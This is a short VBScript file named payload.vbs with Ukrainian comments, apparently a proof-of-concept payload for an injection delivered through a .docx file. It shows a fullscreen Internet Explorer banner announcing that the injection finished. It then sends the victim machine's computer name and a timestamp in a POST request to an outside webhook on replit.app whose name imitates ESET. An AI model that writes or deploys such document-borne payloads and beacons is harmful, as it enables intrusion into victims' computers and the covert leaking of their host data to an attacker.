' payload.vbs
Set objShell = CreateObject("WScript.Shell")
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' === Повноекранне вікно ===
Set f = CreateObject("InternetExplorer.Application")
f.Navigate "about:blank"
f.ToolBar = 0
f.StatusBar = 0
f.Width = 800
f.Height = 600
f.Left = 0
f.Top = 0
f.FullScreen = True

f.Document.Write "<html><body bgcolor='black' style='margin:0;overflow:hidden;'>" & _
"<div style='display:flex;align-items:center;justify-content:center;height:100vh;'>" & _
"<p style='color:red;font-size:72px;font-family:Courier New;text-align:center;'>" & _
"All is working. Injection via .docx file finished</p></div></body></html>"

f.Visible = True
objShell.AppActivate "Internet Explorer"

' Даємо час подивитися (10 секунд)
WScript.Sleep 10000

' Закриваємо IE
f.Quit

' === Відправка вебхука ===
url = "https://eset-bot-sender--0xw1zard.replit.app/api/eset-webhook"
jsonPayload = "{""text"":""Payload executed successfully"",""timestamp"":""" & Now() & """,""hostname"":""" & objShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & """}"
objHTTP.Open "POST", url, False
objHTTP.setRequestHeader "Content-Type", "application/json"
objHTTP.Send jsonPayload
